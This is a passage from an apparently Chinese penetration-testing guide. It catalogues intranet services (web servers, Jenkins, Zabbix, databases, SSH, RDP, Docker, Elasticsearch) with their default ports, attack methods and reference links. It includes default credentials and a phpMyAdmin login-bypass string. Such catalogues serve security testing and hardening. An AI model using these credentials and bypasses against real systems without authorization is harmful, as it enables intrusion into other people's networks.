Framework提供了一个简易的开发方式，这种开发方式，将避免那些可能致使底层代码变得繁杂混乱的大量的属性文件和帮助类。</p><ul><li>可利用漏洞<ul><li>CVE-2010-1622</li><li>CVE-2018-1274</li><li>CVE-2018-1270</li><li>CVE-2018-1273</li><li>反序列化</li><li>目录穿越</li></ul></li><li>参考<ul><li><a href="http://www.inbreak.net/archives/377" target="_blank" rel="noopener">http://www.inbreak.net/archives/377</a></li><li><a href="https://www.secpulse.com/archives/71762.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/71762.html</a></li><li><a href="http://www.open-open.com/news/view/1225d07" target="_blank" rel="noopener">http://www.open-open.com/news/view/1225d07</a></li><li><a href="https://xz.aliyun.com/t/2261" target="_blank" rel="noopener">https://xz.aliyun.com/t/2261</a></li><li><a href="https://xz.aliyun.com/t/2252" target="_blank" rel="noopener">https://xz.aliyun.com/t/2252</a></li></ul></li></ul><h3 id="2-1-4-Web-服务器"><a href="#2-1-4-Web-服务器" class="headerlink" title="2.1.4 Web 服务器"></a>2.1.4 Web 服务器</h3><ul><li><strong>IIS</strong>：Windows 的 WWW 服务器<ul><li>端口：80</li><li>攻击方法：<ul><li>IIS，开启了 WebDAV，可以直接详服务器 PUT 文件</li><li>短文件名枚举漏洞</li><li>远程代码执行</li><li>提权漏洞</li><li>解析漏洞</li></ul></li><li>参考：<ul><li><a href="https://masterxsec.github.io/2017/06/07/IIS-write-漏洞利用/" target="_blank" rel="noopener">https://masterxsec.github.io/2017/06/07/IIS-write-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/</a></li><li><a href="http://www.freebuf.com/articles/4908.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/4908.html</a></li><li><a href="https://www.anquanke.com/post/id/85811" target="_blank" rel="noopener">https://www.anquanke.com/post/id/85811</a></li></ul></li></ul></li><li><strong>Apache</strong><ul><li>端口：80</li><li>攻击方法：<ul><li>解析漏洞</li><li>目录遍历</li></ul></li></ul></li><li><strong>Nginx</strong><ul><li>端口：80</li><li>攻击方法：<ul><li>解析漏洞</li><li>目录遍历</li><li>CVE-2016-1247：需要获取主机操作权限，攻击者可通过软链接任意文件来替换日志文件，从而实现提权以获取服务器的root权限。</li></ul></li><li>参考：<ul><li><a href="https://www.seebug.org/vuldb/ssvid-92538" target="_blank" rel="noopener">https://www.seebug.org/vuldb/ssvid-92538</a></li></ul></li></ul></li><li><strong>lighttpd</strong><ul><li>端口：80</li><li>攻击方法：<ul><li>目录遍历</li></ul></li></ul></li></ul><h2 id="2-2-常见运维系统"><a href="#2-2-常见运维系统" class="headerlink" title="2.2 常见运维系统"></a>2.2 常见运维系统</h2><p>一般分自动化部署和运维监控相关的的工具。漏洞可以通过搜索引擎搜索，github搜索，ExploitDB搜索，官网上的安全通告获取。<br>内网的通用类应用比较常见的问题是弱口令，如果一个管理员可以登录几个系统，那在这几个系统的账号、密码也基本上是一样的。</p><h3 id="2-2-1-Gitlab"><a href="#2-2-1-Gitlab" class="headerlink" title="2.2.1 Gitlab"></a>2.2.1 Gitlab</h3><p>GitLab是一个利用 Ruby on Rails 开发的开源应用程序，实现一个自托管的项目仓库，可通过Web界面进行访问公开的或者私人项目。</p><ul><li>可利用漏洞：<ul><li>任意文件读取漏洞</li><li>意用户 token 泄露漏洞</li><li>命令执行漏洞</li></ul></li><li>参考：<ul><li><a href="http://blog.knownsec.com/2016/11/gitlab-file-read-vulnerability-cve-2016-9086-and-access-all-user-authentication-token/" target="_blank" rel="noopener">http://blog.knownsec.com/2016/11/gitlab-file-read-vulnerability-cve-2016-9086-and-access-all-user-authentication-token/</a></li><li><a href="http://rinige.com/index.php/archives/577/" target="_blank" rel="noopener">http://rinige.com/index.php/archives/577/</a></li></ul></li></ul><h3 id="2-2-2-Jenkins"><a href="#2-2-2-Jenkins" class="headerlink" title="2.2.2 Jenkins"></a>2.2.2 Jenkins</h3><p>Jenkins是一种跨平台的持续集成和交付的应用软件，它便于不断稳定地交付新的软件版本，并提高你的工作效率。这款开发运维工具还让开发人员更容易把项目的变化整合起来，并使用大量的测试和部署技术。</p><ul><li>可利用漏洞：<ul><li>远程代码执行漏洞</li><li>反序列化漏洞</li><li>未授权访问漏洞</li><li>登录入口爆破</li></ul></li><li>参考<ul><li><a href="https://www.cnblogs.com/backlion/p/6813260.html" target="_blank" rel="noopener">https://www.cnblogs.com/backlion/p/6813260.html</a></li><li><a href="https://www.anquanke.com/post/id/86018" target="_blank" rel="noopener">https://www.anquanke.com/post/id/86018</a></li><li><a href="https://paper.seebug.org/199/" target="_blank" rel="noopener">https://paper.seebug.org/199/</a></li></ul></li></ul><h3 id="2-2-3-Puppet"><a href="#2-2-3-Puppet" class="headerlink" title="2.2.3 Puppet"></a>2.2.3 Puppet</h3><p>Puppet Enterprise专门管理基础设施即代码(IAC)，在这种类型的IT基础设施配置过程中，系统用代码而不是脚本流程来自动构建、管理和配置。由于它是代码，整个过程易于重复。Puppet有助于更容易控制版本、自动化测试和持续交付，可以更快速地响应问题或错误。</p><ul><li>可利用漏洞，很少公开的POC<ul><li>反序列化</li><li>远程命令执行</li></ul></li></ul><h3 id="2-2-4-Ansible"><a href="#2-2-4-Ansible" class="headerlink" title="2.2.4 Ansible"></a>2.2.4 Ansible</h3><p>Ansible是一种配置和管理工具，面向客户端的软件部署和配置，支持Unix、Linux和Windows。它使 用JSON和YAML，而不是IAC，根本不需要节点代理就可以安装。它可以通过OpenStack在内部系统上使用，也可以在亚马逊EC2上使用。</p><ul><li>可利用漏洞<ul><li>远程代码执行</li></ul></li></ul><h3 id="2-2-5-Nagios"><a href="#2-2-5-Nagios" class="headerlink" title="2.2.5 Nagios"></a>2.2.5 Nagios</h3><p>Nagios是一款开源的电脑系统和网络监视工具，能有效监控Windows、Linux和Unix的主机状态，交换机路由器等网络设置，打印机等。在系统或服务状态异常时发出邮件或短信报警第一时间通知网站运维人员，在状态恢复后发出正常的邮件或短信通知。</p><ul><li>可利用漏洞<ul><li>代码执行</li><li>SQLi</li></ul></li><li>参考<ul><li><a href="http://www.bugku.com/thread-87-1-1.html" target="_blank" rel="noopener">http://www.bugku.com/thread-87-1-1.html</a></li><li><a href="http://www.mottoin.com/93936.html" target="_blank" rel="noopener">http://www.mottoin.com/93936.html</a></li></ul></li></ul><h3 id="2-2-6-Zabbix"><a href="#2-2-6-Zabbix" class="headerlink" title="2.2.6 Zabbix"></a>2.2.6 Zabbix</h3><p>Zabbix 是一款强大的开源分布式监控系统, 能够将<code>SNMP</code>、<code>JMX</code>、<code>Zabbix Agent</code>提供的数据通过<code>WEB GUI</code>的方式进行展示.</p><ul><li>可利用漏洞（具体参考 ExploitDB）：<ul><li>远程代码执行</li><li>SQLi</li><li>shell 命令注入</li><li>认证绕过</li><li>默认账户与密码，默认口令 admin/zabbix，或者是guest/空</li></ul></li><li>参考<ul><li><a href="https://blog.csdn.net/ytuo1223/article/details/45937981" target="_blank" rel="noopener">https://blog.csdn.net/ytuo1223/article/details/45937981</a></li><li><a href="http://vinc.top/2017/04/18/zabbix漏洞总结/" target="_blank" rel="noopener">http://vinc.top/2017/04/18/zabbix%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/</a></li><li><a href="http://www.mottoin.com/87570.html" target="_blank" rel="noopener">http://www.mottoin.com/87570.html</a></li></ul></li></ul><h3 id="2-2-7-Cacit"><a href="#2-2-7-Cacit" class="headerlink" title="2.2.7 Cacit"></a>2.2.7 Cacit</h3><p>Cacti是一套基于PHP,MySQL,SNMP及RRDTool开发的网络流量监测图形分析工具。</p><ul><li>可利用漏洞<ul><li>任意代码执行</li><li>SQLi</li><li>登录爆破</li><li>默认密码admin/admin</li></ul></li><li>参考：<ul><li><a href="http://wooyun.jozxing.cc/static/bugs/wooyun-2011-02674.html" target="_blank" rel="noopener">http://wooyun.jozxing.cc/static/bugs/wooyun-2011-02674.html</a></li></ul></li></ul><h3 id="2-2-8-Splunk"><a href="#2-2-8-Splunk" class="headerlink" title="2.2.8 Splunk"></a>2.2.8 Splunk</h3><p>Splunk Enterprise 可以从任何来源监控和分析机器数据，以提供操作智能，从而优化您的 IT、安全和业务绩效。Splunk Enterprise 具有直观的分析功能、机器学习、打包应用程序和开放式 API，是一个灵活的平台，可从重点用例扩展到企业范围的分析主干。</p><ul><li>可利用漏洞<ul><li>信息泄露</li><li>命令注入</li><li>服务端请求伪造</li></ul></li><li>参考<ul><li>ExploitDB 搜索</li></ul></li></ul><h2 id="2-3-常见-Web-应用"><a href="#2-3-常见-Web-应用" class="headerlink" title="2.3 常见 Web 应用"></a>2.3 常见 Web 应用</h2><p>还有常见邮件应用、CMS 应用，在搜索引擎上查找对应的漏洞，利用已知漏洞进行攻击。</p><h3 id="2-3-1-邮件系统"><a href="#2-3-1-邮件系统" class="headerlink" title="2.3.1 邮件系统"></a>2.3.1 邮件系统</h3><p>一部分是使用腾讯企业邮箱、阿里企业邮箱的，很难有可利用的漏洞，另外一种是能独立部署的邮件系统，政企常用的邮箱应用：</p><ul><li>Coremail</li><li>亿邮</li><li>35互联</li><li>TurboMail</li><li>Exchange</li><li>IBM Lotus</li></ul><h3 id="2-3-2-CMS-应用"><a href="#2-3-2-CMS-应用" class="headerlink" title="2.3.2 CMS 应用"></a>2.3.2 CMS 应用</h3><h2 id="2-4-数据库-缓存-消息服务"><a href="#2-4-数据库-缓存-消息服务" class="headerlink" title="2.4 数据库/缓存/消息服务"></a>2.4 数据库/缓存/消息服务</h2><h3 id="2-4-1-MySQL数据库"><a href="#2-4-1-MySQL数据库" class="headerlink" title="2.4.1 MySQL数据库"></a>2.4.1 MySQL数据库</h3><ul><li>默认端口：3306</li><li>攻击方法：<ul><li>爆破：弱口令</li><li>身份认证漏洞：<a href="http://www.freebuf.com/vuls/3815.html" target="_blank" rel="noopener">CVE-2012-2122</a></li><li>拒绝服务攻击</li><li>Phpmyadmin万能密码绕过：用户名：‘localhost’@’@” 密码任意</li><li>提权</li></ul></li><li>参考：<ul><li><a href="https://www.seebug.org/appdir/MySQL" target="_blank" rel="noopener">https://www.seebug.org/appdir/MySQL</a></li><li><a href="http://www.waitalone.cn/mysql-tiquan-summary.html?replytocom=390" target="_blank" rel="noopener">http://www.waitalone.cn/mysql-tiquan-summary.html?replytocom=390</a></li><li><a href="https://xz.aliyun.com/t/1491" target="_blank" rel="noopener">https://xz.aliyun.com/t/1491</a></li></ul></li></ul><h3 id="2-4-2-MSSQL数据库"><a href="#2-4-2-MSSQL数据库" class="headerlink" title="2.4.2 MSSQL数据库"></a>2.4.2 MSSQL数据库</h3><ul><li>默认端口：1433（Server 数据库服务）、1434（Monitor 数据库监控）</li><li>攻击方法：<ul><li>爆破：弱口令/使用系统用户</li><li>注入</li></ul></li><li>参考：<ul><li><a href="https://www.anquanke.com/post/id/86011" target="_blank" rel="noopener">https://www.anquanke.com/post/id/86011</a></li></ul></li></ul><h3 id="2-4-3-Oracle数据库"><a href="#2-4-3-Oracle数据库" class="headerlink" title="2.4.3 Oracle数据库"></a>2.4.3 Oracle数据库</h3><ul><li>默认端口：1521（数据库端口）、1158（Oracle EMCTL端口）、8080（Oracle XDB数据库）、210（Oracle XDB FTP服务）</li><li>攻击方法：<ul><li>爆破：弱口令</li><li>注入攻击；</li><li>漏洞攻击；<br>-参考：</li><li><a href="https://www.leiphone.com/news/201711/JjzXFp46zEPMvJod.html" target="_blank" rel="noopener">https://www.leiphone.com/news/201711/JjzXFp46zEPMvJod.html</a></li></ul></li></ul><h3 id="2-4-4-PostgreSQL数据库"><a href="#2-4-4-PostgreSQL数据库" class="headerlink" title="2.4.4 PostgreSQL数据库"></a>2.4.4 PostgreSQL数据库</h3><p>PostgreSQL是一种特性非常齐全的自由软件的对象–关系型数据库管理系统，可以说是目前世界上最先进，功能最强大的自由数据库管理系统。包括kali系统中msf也使用这个数据库；<a href="http://lcx.cc/?i=1275" target="_blank" rel="noopener">浅谈postgresql数据库攻击技术</a> 大部分关于它的攻击依旧是sql注入，所以注入才是数据库不变的话题。</p><ul><li>默认端口：5432</li><li>攻击方法：<ul><li>爆破：弱口令：postgres postgres</li><li>缓冲区溢出：CVE-2014-2669</li></ul></li><li>参考：<ul><li><a href="http://drops.xmd5.com/static/drops/tips-6449.html" target="_blank" rel="noopener">http://drops.xmd5.com/static/drops/tips-6449.html</a></li><li><a href="https://www.secpulse.com/archives/69153.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/69153.html</a></li></ul></li></ul><h3 id="2-4-5-MongoDB数据库"><a href="#2-4-5-MongoDB数据库" class="headerlink" title="2.4.5 MongoDB数据库"></a>2.4.5 MongoDB数据库</h3><p>MongoDB，NoSQL数据库；攻击方法与其他数据库类似》</p><ul><li>默认端口：27017</li><li>攻击方法：<ul><li>爆破：弱口令</li><li>未授权访问；github有攻击代码；<a href="https://github.com/yangbh/Hammer/blob/master/plugins/System/mongodb_unauth_access.py" target="_blank" rel="noopener">请点击</a></li></ul></li><li>参考：<ul><li><a href="http://www.cnblogs.com/LittleHann/p/6252421.html" target="_blank" rel="noopener">http://www.cnblogs.com/LittleHann/p/6252421.html</a></li><li><a href="http://www.tiejiang.org/19157.html" target="_blank" rel="noopener">http://www.tiejiang.org/19157.html</a></li></ul></li></ul><h3 id="2-4-6-Redis数据库"><a href="#2-4-6-Redis数据库" class="headerlink" title="2.4.6 Redis数据库"></a>2.4.6 Redis数据库</h3><p>Redis是一个开源的使用c语言写的，支持网络、可基于内存亦可持久化的日志型、key-value数据库。关于这个数据库这两年还是很火的，暴露出来的问题也很多。特别是前段时间暴露的未授权访问。</p><ul><li>攻击方法：<ul><li>爆破：弱口令</li><li>未授权访问+配合ssh key提权；</li></ul></li><li>参考：<ul><li><a href="http://www.alloyteam.com/2017/07/12910/" target="_blank" rel="noopener">http://www.alloyteam.com/2017/07/12910/</a></li></ul></li></ul><h3 id="2-4-7-SysBase数据库"><a href="#2-4-7-SysBase数据库" class="headerlink" title="2.4.7 SysBase数据库"></a>2.4.7 SysBase数据库</h3><ul><li>默认端口：服务端口5000；监听端口4100；备份端口：4200</li><li>攻击方法：<ul><li>爆破：弱口令</li><li>命令注入：</li></ul></li><li>参考</li></ul><h3 id="2-4-8-DB2-数据库"><a href="#2-4-8-DB2-数据库" class="headerlink" title="2.4.8 DB2 数据库"></a>2.4.8 DB2 数据库</h3><ul><li>默认端口：5000</li><li>攻击方法：<ul><li>安全限制绕过：成功后可执行未授权操作（CVE-2015-1922）</li></ul></li><li>参考：<ul><li><a href="http://23.94.222.93/bug_detail.php?wybug_id=wooyun-2015-0113071" target="_blank" rel="noopener">http://23.94.222.93/bug_detail.php?wybug_id=wooyun-2015-0113071</a></li></ul></li></ul><h2 id="2-5-常见服务-协议"><a href="#2-5-常见服务-协议" class="headerlink" title="2.5 常见服务/协议"></a>2.5 常见服务/协议</h2><h3 id="2-5-1-FTP-服务"><a href="#2-5-1-FTP-服务" class="headerlink" title="2.5.1 FTP 服务"></a>2.5.1 FTP 服务</h3><p>FTP服务：ftp服务我分为两种情况，第一种是使用系统软件来配置，比如IIS中的FTP文件共享或Linux中的默认服务软件；第二种是通过第三方软件来配置，比如Serv-U还有一些网上写的简易ftp服务器等；<br>默认端口：20（数据端口）；21（控制端口）；69（tftp小型文件传输协议）</p><ul><li>攻击方式：</li><li>爆破：ftp的爆破工具有很多，这里我推荐owasp的<a href="https://sourceforge.net/projects/worawita/" target="_blank" rel="noopener">Bruter</a> 以及msf中ftp爆破模块；</li><li>匿名访问：用户名：anonymous 密码：为空或任意邮箱</li><li>嗅探：ftp使用明文传输技术（但是嗅探给予局域网并需要欺骗或监听网关）</li><li>后门 vsftp</li><li>远程溢出</li><li>跳转攻击</li></ul><h3 id="2-5-2-NFS-服务"><a href="#2-5-2-NFS-服务" class="headerlink" title="2.5.2 NFS 服务"></a>2.5.2 NFS 服务</h3><p>NFS（Network File System）即网络文件系统，是FreeBSD支持的文件系统中的一种，它允许网络中的计算机之间通过TCP/IP网络共享资源。在NFS的应用中，本地NFS的客户端应用可以透明地读写位于远端NFS服务器上的文件，就像访问本地文件一样。如今NFS具备了防止被利用导出文件夹的功能，但遗留系统中的NFS服务配置不当，则仍可能遭到恶意攻击者的利用。</p><ul><li>攻击方法<ul><li>未授权访问</li></ul></li><li>参考<ul><li><a href="http://www.freebuf.com/articles/network/159468.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/network/159468.html</a></li><li><a href="http://www.vuln.cn/6368" target="_blank" rel="noopener">http://www.vuln.cn/6368</a></li></ul></li></ul><h3 id="2-5-3-Samba服务"><a href="#2-5-3-Samba服务" class="headerlink" title="2.5.3 Samba服务"></a>2.5.3 Samba服务</h3><p>Samba是linux和unix系统上实现SMB/CIFS协议的一个免费软件，由服务器和客户端程序构成。而SMB是局域网支持共享文件和打印机的一种通信协议，为局域网内不同计算机之间提供文件及打印机等资源的共享服务。</p><ul><li>攻击方法<ul><li>远程代码执行</li><li>弱口令</li><li>未授权访问（public）</li></ul></li><li>参考<ul><li><a href="http://www.91ri.org/17114.html" target="_blank" rel="noopener">http://www.91ri.org/17114.html</a></li></ul></li></ul><h3 id="2-5-4-SSH-服务"><a href="#2-5-4-SSH-服务" class="headerlink" title="2.5.4 SSH 服务"></a>2.5.4 SSH 服务</h3><p>SSH 是协议，通常使用 OpenSSH 软件实现协议应用。SSH 为 Secure Shell 的缩写，由 IETF 的网络工作小组（Network Working Group）所制定；SSH 为建立在应用层和传输层基础上的安全协议。SSH 是目前较可靠，专为远程登录会话和其它网络服务提供安全性的协议。利用 SSH 协议可以有效防止远程管理过程中的信息泄露问题。</p><ul><li>端口：22</li><li>攻击方法：<ul><li>爆破</li><li>后门</li><li>漏洞：28退格漏洞、OpenSSL漏洞</li></ul></li><li>参考<ul><li><a href="https://cloud.tencent.com/developer/article/1078187" target="_blank" rel="noopener">https://cloud.tencent.com/developer/article/1078187</a></li></ul></li></ul><h3 id="2-5-5-Telnet-服务"><a href="#2-5-5-Telnet-服务" class="headerlink" title="2.5.5 Telnet 服务"></a>2.5.5 Telnet 服务</h3><p>Telnet协议是TCP/IP协议族中的一员，是Internet远程登陆服务的标准协议和主要方式。它为用户提供了在本地计算机上完成远程主机工作的能力。在終端使用者的电脑上使用telnet程序，用它连接到服务器。終端使用者可以在telnet程序中输入命令，这些命令会在服务器上运行，就像直接在服务器的控制台上输入一样。可以在本地就能控制服务器。</p><ul><li>默认端口：21</li><li>攻击方法：<ul><li>爆破</li><li>嗅探</li></ul></li></ul><h3 id="2-5-6-Windows-远程连接"><a href="#2-5-6-Windows-远程连接" class="headerlink" title="2.5.6 Windows 远程连接"></a>2.5.6 Windows 远程连接</h3><ul><li>默认端口：3389</li><li>攻击方法<ul><li>爆破</li><li>Shift粘滞键后门：5次shift后门</li><li>利用ms12-020攻击3389端口</li></ul></li></ul><h3 id="2-5-7-VNC服务"><a href="#2-5-7-VNC服务" class="headerlink" title="2.5.7 VNC服务"></a>2.5.7 VNC服务</h3><p>VNC（Virtual Network Computing），为一种使用RFB协议的显示屏画面分享及远程操作软件。此软件借由网络，可发送键盘与鼠标的动作及即时的显示屏画面。</p><ul><li>默认端口：5900+桌面ID（5901；5902）</li><li>攻击方式：<ul><li>爆破：弱口令</li><li>认证口令绕过：</li><li>拒绝服务攻击：（<a href="http://drops.wooyun.org/papers/9014" target="_blank" rel="noopener">CVE-2015-5239</a>）</li><li>权限提升：（CVE-2013-6886）</li></ul></li></ul><h3 id="2-5-8-SMTP协议"><a href="#2-5-8-SMTP协议" class="headerlink" title="2.5.8 SMTP协议"></a>2.5.8 SMTP协议</h3><p>smtp：邮件协议，在linux中默认开启这个服务，可以向对方发送钓鱼邮件！</p><ul><li>默认端口：25（smtp）、465（smtps）</li><li>攻击方式：<ul><li>爆破：弱口令</li><li>未授权访问</li></ul></li></ul><h3 id="2-5-9-POP3协议"><a href="#2-5-9-POP3协议" class="headerlink" title="2.5.9 POP3协议"></a>2.5.9 POP3协议</h3><ul><li>默认端口：109（POP2）、110（POP3）、995（POP3S）</li><li>攻击方式：<ul><li>爆破；弱口令</li><li>未授权访问；</li></ul></li></ul><h3 id="2-5-10-DNS服务"><a href="#2-5-10-DNS服务" class="headerlink" title="2.5.10 DNS服务"></a>2.5.10 DNS服务</h3><ul><li>默认端口：53</li><li>攻击方式：<ul><li>区域传输漏洞</li></ul></li></ul><h3 id="2-5-11-IMAP协议"><a href="#2-5-11-IMAP协议" class="headerlink" title="2.5.11 IMAP协议"></a>2.5.11 IMAP协议</h3><ul><li>默认端口：143（imap）、993（imaps）</li><li>攻击方式：<ul><li>爆破：弱口令</li><li>配置不当</li></ul></li></ul><h3 id="2-5-12-SNMP协议"><a href="#2-5-12-SNMP协议" class="headerlink" title="2.5.12 SNMP协议"></a>2.5.12 SNMP协议</h3><ul><li>默认端口：161</li><li>攻击方式:<ul><li>爆破：弱口令</li></ul></li></ul><h3 id="2-5-13-DHCP服务"><a href="#2-5-13-DHCP服务" class="headerlink" title="2.5.13 DHCP服务"></a>2.5.13 DHCP服务</h3><ul><li>默认端口：67&amp;68、546（DHCP Failover做双机热备的）</li><li>攻击方式：<ul><li>DHCP劫持；</li></ul></li></ul><h2 id="2-6-云环境"><a href="#2-6-云环境" class="headerlink" title="2.6 云环境"></a>2.6 云环境</h2><h3 id="2-6-1-VMware"><a href="#2-6-1-VMware" class="headerlink" title="2.6.1 VMware"></a>2.6.1 VMware</h3><p>使用 VMware vCloud 可将现有数据中心内的虚拟基础架构资源池化，并将其作为基于目录的服务交付。通过与云计算基础架构的最佳平台 VMware vSphere 配合使用，VMware vCloud Director 可为客户提供构建安全的私有云，从而改变 IT 部门交付和管理基础架构服务以及用户访问和使用这些服务的方式。<br>一般组织中很多独立安装的 Esxi 形式的私有云，或独立部署的虚拟化系统。</p><ul><li>端口（很多）：<ul><li><a href="https://kb.vmware.com/s/article/2115330" target="_blank" rel="noopener">https://kb.vmware.com/s/article/2115330</a></li><li><a href="https://kb.vmware.com/s/article/2081930" target="_blank" rel="noopener">https://kb.vmware.com/s/article/2081930</a></li></ul></li><li>漏洞<ul><li>主机逃逸</li><li>CVE-2017-5638</li></ul></li><li>参考：<ul><li><a href="https://paper.seebug.org/348/" target="_blank" rel="noopener">https://paper.seebug.org/348/</a></li><li><a href="http://www.freebuf.com/articles/system/141179.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/system/141179.html</a></li><li><a href="http://www.mottoin.com/100651.html" target="_blank" rel="noopener">http://www.mottoin.com/100651.html</a></li><li><a href="http://www.52bug.cn/黑客技术/4375.html" target="_blank" rel="noopener">http://www.52bug.cn/%E9%BB%91%E5%AE%A2%E6%8A%80%E6%9C%AF/4375.html</a></li><li><a href="https://twitter.com/VMwareSRC" target="_blank" rel="noopener">https://twitter.com/VMwareSRC</a></li><li><a href="https://loudong.sjtu.edu.cn/?keyword=vmware&serverity=高危&page=1" target="_blank" rel="noopener">https://loudong.sjtu.edu.cn/?keyword=vmware&amp;serverity=%E9%AB%98%E5%8D%B1&amp;page=1</a></li><li><a href="https://www.vmware.com/cn/security/hardening-guides.html" target="_blank" rel="noopener">https://www.vmware.com/cn/security/hardening-guides.html</a></li></ul></li></ul><h3 id="2-6-2-OpenStack"><a href="#2-6-2-OpenStack" class="headerlink" title="2.6.2 OpenStack"></a>2.6.2 OpenStack</h3><p>OpenStack是基础设施即服务（IaaS）软件，让任何人都可以自行创建和提供云计算服务。此外，OpenStack也用作创建防火墙内的“私有云”（Private Cloud），提供机构或企业内各部门共享资源。</p><ul><li>漏洞，有漏洞但是POC基本没有。检查时候可以参考安全的配置实践。<ul><li>权限绕过漏洞</li><li>信息泄露</li><li>代码执行漏洞</li></ul></li><li>参考：<ul><li><a href="https://loudong.sjtu.edu.cn/?keyword=openstack&serverity=高危" target="_blank" rel="noopener">https://loudong.sjtu.edu.cn/?keyword=openstack&amp;serverity=%E9%AB%98%E5%8D%B1</a></li><li><a href="https://docs.openstack.org/liberty/zh_CN/install-guide-obs/environment-security.html" target="_blank" rel="noopener">https://docs.openstack.org/liberty/zh_CN/install-guide-obs/environment-security.html</a></li><li><a href="http://www.freebuf.com/news/topnews/107203.html" target="_blank" rel="noopener">http://www.freebuf.com/news/topnews/107203.html</a></li></ul></li></ul><h3 id="2-6-3-Docker"><a href="#2-6-3-Docker" class="headerlink" title="2.6.3 Docker"></a>2.6.3 Docker</h3><p>Docker是一个开放源代码软件项目，让应用程序布署在软件容器下的工作可以自动化进行，借此在Linux操作系统上，提供一个额外的软件抽象层，以及操作系统层虚拟化的自动管理机制[1]。Docker利用Linux核心中的资源分脱机制，例如cgroups，以及Linux核心名字空间（name space），来创建独立的软件容器（containers）。这可以在单一Linux实体下运作，避免引导一个虚拟机造成的额外负担。Linux核心对名字空间的支持完全隔离了工作环境中应用程序的视野，包括进程树、网络、用户ID与挂载文件系统，而核心的cgroup提供资源隔离，包括CPU、内存、block I/O与网络。从0.9版本起，Dockers在使用抽象虚拟是经由libvirt的LXC与systemd - nspawn提供界面的基础上，开始包括libcontainer函数库做为以自己的方式开始直接使用由Linux核心提供的虚拟化的设施。</p><ul><li>安全问题（很少有漏洞的POC，安全检查也是基于最佳实践和官方安全建议进行）：<ul><li>内核漏洞（Kernel exploits） 容器是基于内核的虚拟化，主机（host）和主机上的所有容器共享一套内核。如果某个容器的操作造成了内核崩溃，那么反过来整台机器上的容器都会受到影响。<ul><li>CVE-2015-3630 1.6.0 Docker Libcontainer 安全绕过漏洞</li><li>CVE-2015-3627 1.6.1 Libcontainer和Docker Engine 权限许可和访问控制漏洞</li><li>CVE-2015-3630 1.6.1 Docker Engine 安全绕过漏洞</li><li>CVE-2014-9358 1.3.3 Docker 目录遍历漏洞</li><li>CVE-2014-9357 1.3.2 Docker 权限许可和访问控制漏洞</li><li>CVE-2014-6408 1.3.1 Docker 权限许可和访问控制漏洞</li><li>CVE-2014-5277 1.3.0 Docker和docker-py 代码注入漏洞</li></ul></li><li>拒绝服务攻击（Denial-of-service attacks） 所有的容器都共享了内核资源，如果一个容器独占了某一个资源（内存、CPU、各种ID），可能会造成其他容器因为资源匮乏无法工作（形成DoS攻击）。</li><li>容器突破（Container breakouts） Linux的namespace机制是容器的核心之一，它允许容器内部拥有一个PID=1的进程而在容器外部这个进程号又是不一样的（比如1234）。现在问题在于如果一个PID=1的进程突破了namespace的限制，那么他将会在主机上获得root权限。</li><li>有毒镜像（Poisoned images） 主要是考虑到镜像本身的安全性，没太多好说的。</li></ul></li><li>参考：<ul><li><a href="https://toutiao.io/posts/2y9xx8/preview" target="_blank" rel="noopener">https://toutiao.io/posts/2y9xx8/preview</a></li><li><a href="http://www.yunweipai.com/archives/21610.html" target="_blank" rel="noopener">http://www.yunweipai.com/archives/21610.html</a></li><li><a href="http://www.91ri.org/15837.html" target="_blank" rel="noopener">http://www.91ri.org/15837.html</a></li><li><a href="https://blog.csdn.net/ruidu_doer/article/details/53401523" target="_blank" rel="noopener">https://blog.csdn.net/ruidu_doer/article/details/53401523</a></li><li><a href="https://loudong.sjtu.edu.cn/?keyword=docker&serverity=高危" target="_blank" rel="noopener">https://loudong.sjtu.edu.cn/?keyword=docker&amp;serverity=%E9%AB%98%E5%8D%B1</a></li><li><a href="http://dockone.io/article/150" target="_blank" rel="noopener">http://dockone.io/article/150</a></li><li><a href="http://www.dockerinfo.net/docker/docker安全" target="_blank" rel="noopener">http://www.dockerinfo.net/docker/docker%E5%AE%89%E5%85%A8</a></li><li><a href="https://blog.waterstrong.me/docker-security/" target="_blank" rel="noopener">https://blog.waterstrong.me/docker-security/</a></li></ul></li></ul><h2 id="2-7-大数据"><a href="#2-7-大数据" class="headerlink" title="2.7 大数据"></a>2.7 大数据</h2><h3 id="2-7-1-Elsaticsearch"><a href="#2-7-1-Elsaticsearch" class="headerlink" title="2.7.1 Elsaticsearch"></a>2.7.1 Elsaticsearch</h3><p>Elasticsearch 是一个分布式的搜索和分析引擎，可以用于全文检索、结构化检索和分析，并能将这三者结合起来。Elasticsearch 基于 Lucene 开发，现在是使用最广的开源搜索引擎之一，Wikipedia、Stack Overflow、GitHub 等都基于 Elasticsearch 来构建他们的搜索引擎。</p><ul><li>默认端口：9200（）、9300（）</li><li>攻击方法：<ul><li>未授权访问；</li><li>远程命令执行；</li><li>文件遍历；</li><li>低版本webshell植入；</li></ul></li><li>参考<ul><li><a href="http://www.freebuf.com/sectool/38025.html" target="_blank" rel="noopener">http://www.freebuf.com/sectool/38025.html</a></li><li><a href="https://www.secpulse.com/archives/5401.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/5401.html</a></li></ul></li></ul><h3 id="2-7-2-hadoop"><a href="#2-7-2-hadoop" class="headerlink" title="2.7.2 hadoop"></a>2.7.2 hadoop</h3><p>Hadoop是一个开源的框架，可编写和运行分布式应用处理大规模数据，是专为离线和大规模数据分析而设计的，并不适合那种对几个记录随机读写的在线事务处理模式。Hadoop=HDFS（文件系统，数据存储技术相关）+ Mapreduce（数据处理），Hadoop的数据来源可以是任何形式，在处理半结构化和非结构化数据上与关系型数据库相比有更好的性能，具有更灵活的处理能力，不管任何数据形式最终会转化为key/value，key/value是基本数据单元。用函数式变成Mapreduce代替SQL，SQL是查询语句，而Mapreduce则是使用脚本和代码，而对于适用于关系型数据库，习惯SQL的Hadoop有开源工具hive代替。 Hadoop就是一个分布式计算的解决方案。</p><p>参考：</p><ul><li><a href="https://tech.meituan.com/hadoop-security-practice.html" target="_blank" rel="noopener">https://tech.meituan.com/hadoop-security-practice.html</a></li><li><a href="https://zhuanlan.zhihu.com/p/33525241" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/33525241</a></li><li><a href="https://www.anquanke.com/post/id/85343" target="_blank" 